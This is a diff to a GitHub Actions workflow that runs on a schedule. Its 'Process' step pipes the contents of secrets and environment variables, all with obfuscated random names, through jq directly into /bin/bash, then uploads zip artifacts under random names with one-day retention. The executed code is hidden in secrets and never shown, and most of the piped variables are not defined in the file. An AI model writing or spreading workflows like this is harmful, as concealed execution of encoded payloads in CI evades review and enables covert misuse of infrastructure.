@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '9 4,10,16,22 * * *'
+    - cron: '2 3,9,15,21 * * *'
 permissions:
   contents: read
   actions: read
@@ -24,15 +24,21 @@ jobs:
           fetch-depth: 1
       - name: Process
         env:
-          ov89390: ${{ secrets.ov89390 }}
+          iqu74849: ${{ secrets.iqu74849 }}
         run: |
-          printf '%s' "$ov89390" | jq -r .b98082 | /bin/bash
-          printf '%s' "$s4265" | jq -r .kxvyp8 | /bin/bash
+          printf '%s' "$iqu74849" | jq -r .u3 | /bin/bash
+          echo $iuoea937 | jq -r .cn01 | /bin/bash
+          echo $iqmsf0930 | jq -r .e421 | /bin/bash
+          printf '%s' "$yxuzo97" | jq -r .th44 | /bin/bash
+          printf '%s' "$bbbof2264" | jq -r .a7945 | /bin/bash
+          echo $f2534 | jq -r .ulnby747 | /bin/bash
+          echo $qxhb43754 | jq -r .vghwv7 | /bin/bash
+          echo $wllwk4 | jq -r .uev43 | /bin/bash
 
       - name: Store results
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: v8MBIOtB
+          name: feWItJGg
           path: "*.zip"
           retention-days: 1
